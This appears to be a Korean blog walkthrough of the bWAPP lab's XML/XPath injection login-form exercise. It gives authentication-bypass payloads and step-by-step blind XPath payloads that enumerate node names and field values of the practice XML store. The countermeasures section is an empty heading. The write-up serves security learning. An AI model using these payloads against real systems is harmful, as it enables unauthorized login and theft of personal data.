---
title: "[bWAPP] 1. Injection - XML/XPath Injection (Login Form)"
---

<br>

## Injection

공격자가 신뢰할 수 없는 입력을 프로그램에 주입하도록 하는 공격.

<br>

<br>

## XML/XPath Injection

### XML

eXtensible Markup Language의 약어

W3C에서 개발된 여러 특수 목적의 마크업 언어를 만드는 용도에서 권장되는 다목적 마크업 언어

웹 상의 문서를 구조화하고 전송 데이터를 트리 구조의 노드로 표현, 사용자가 정의한 태그로 데이터를 분류 가능

### XPath

XML Path Language

XML 문서의 구조를 통해 경로 위에 지정한 구문을 사용하여 항목을 배치하고 처리하는 방법을 기술하는 언어

<br>

<br>

## Object

XML 구조에 악의적인 구문을 삽입하거나 XPath를 조작하여 XML의 내용을 노출하는 공격 기법

XML = DB

XPath = SQL

<BR>

![image-20220317160119778](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317160119778.png)

- 작은 따옴표를 넣어보자

![image-20220317160532642](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317160532642.png)

- XPath 구문오류 뜨는 것으로 보아 XML Injection 가능할 것으로 보임
- Login과 password 둘다 AND 연산 될 것으로 추측하며 소스코드 뜯어보자 - xmli_1.php

![image-20220317160752016](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317160752016.png)

- "login =' " . &login . " ' and password=' " . &password . " ' "
- 예상했던 대로 이런식으로 구성되어있다.
- 보기 편하게 큰 따옴표는 제거해주겠다.
- login = ' . &login . ' and password = ' . &password . '
- 자 이제 우리는 &login에다가 XML 코드를 삽입할 거다

<BR>

### 항상 참 구문

![image-20220317161418460](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317161418460.png)

`' or 1=1 or '`

- 먼저 &login 변수 앞의 여려있는 작은따옴표를 닫아주고
- or 1=1 or 로 항상 참인 식으로 완성한다.
- 마지막으로 작은따옴표를 통해 &login 변수 값을 덮어주는 쪽을 열어줌으로써 충족시켜준다.

`login = ' ' or 1=1 or ' ' and password = ' . &password . '`

- 완성 식이다.
- OR 와 AND 연산 우선순위에 의해 AND 먼저 연산 시 AND는 거짓

`login = ' ' or 1=1 or 거짓`

- 1=1 항상 참이기에 결국엔 참으로 반환하는 결과
- 이를 통해 첫 번째 User가 Neo이고, Neo의 Secret은 Oh, why didn't i took that BLACK pill? 이란것을 알아냈다.

<br>

### 거짓 구문

![image-20220317163518301](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317163518301.png)

- 거짓일 때
- 참 거짓을 활용하는 Blind 방식이다.

<br>

### 참 구문 변형

![image-20220317162834026](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317162834026.png)

`neo' or 'a'='a`

`login = 'neo' or 'a'='a' and password = ' . &password . '`

- 이런식으로 또한 항상 참 구문을 만들 수 있다.
- 이를 변형시켜 XPath의 부모노드부터 구해보자

<br>

### 부모 노드 = DB

![image-20220317163222421](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317163222421.png)

`neo' and string-length(name(parent::*))=6 or 'a'='b`

- 먼저 'a'='b 를 해준 이유는
- and 연산에서 참이어야(and 우선 연산) 전체식이 참이되기 때문에 일부러 한 번 꼬아줬다.
- neo는 참이기 때문에 string-length(name(parent::*))=6 이 참이면 참 값을 도출해 낼 것이다.
  - parent : 부모 노드
  - ::* : 지정 노드의 모든(*) 요소
  - name : 인자로 받은 노드의 이름을 반환
  - string-length : 인자로 받은 노드의 길이를 반환

`neo' and substring(name(parent::*),1,1)='a' or 'a'='b`

- 길이를 알아냈다면 다음으로 substring을 통해 실제 문자를 대조해준다.

```sql
SUBSTR(str, pos, len)
```

- str에서 pos 번째 위치의 len 개의 문자를 읽어 들임.

`neo' and name(parent::*)='heroes' or 'a'=b`

- 맞는지 확인해준다.

<br>

### 자식 노드 = 테이블

![image-20220317164103003](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317164103003.png)

```xml
neo' and count(../child::*)=6 or 'a'='b
```

- 자식 노드 수를 구해준다.
  - count : 인자로 받은 노드의 갯수를 반환
  - ../ : 상위 노드
  - child : 자식 노드
  - ::* : 지정 노드의 모든(*) 요소

```xml
neo' and string-length(name(../child::*[position()=1]))=4 or 'a'='b
```

- 자식 노드의 수를 구해줬으면 position 함수를 이용해 n 번째 자식 노드의 이름 길이 값을 구해주자
  - position() = n : SQL의 limit 과 같음 n 번째 노드 반환

```xml
neo' and substring(name(../child::*[position()=1]),1,1)='a' or 'a'='b
```

- 다음 substring 함수를 이용해 실제문자와 대조해준다.

```xml
neo' and name(../child::*[position()=1])='hero' or 'a'='b
```

- 맞는지 확인

<br>

### hero의 자식노드 = 컬럼

![image-20220317165457584](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317165457584.png)

```xml
neo' and count(/heroes/hero[1]/child::*)=6 or 'a'='b
```

- 최상위 부모노드 heroes의 자식노드인 hero[1]의 자식노드 수를 구하고

```xml
neo' and string-length(name(/heroes/hero[1]/child::*[position()=1]))=2 or 'a'='b
```

- 자식노드의 길이 구해주고

```xml
neo' and substring(name(/heroes/hero[1]/child::*[position()=1]),1,1)='i' or 'a'='b
```

- 그에 맞는 문자 찾아준다.

<BR>

### hero의 자식노드 속성 = 컬럼 속성

![image-20220317170152398](https://raw.githubusercontent.com/EONION-TH3DB/image_repo/main/img/image-20220317170152398.png)

```xml
neo' and string-length(name(/heroes/hero[1]/id))=2 or 'a'='b
```

- 각 속성 길이 구해주고

```xml
neo' and substring(name(/heroes/hero[1]/id),1,1)='a' or 'a'='b
```

- 실제 문자 대조해준다.
- 이런 식으로 개인정보 탈취할 수 있다.

<br>

<br>

##  대응 방안





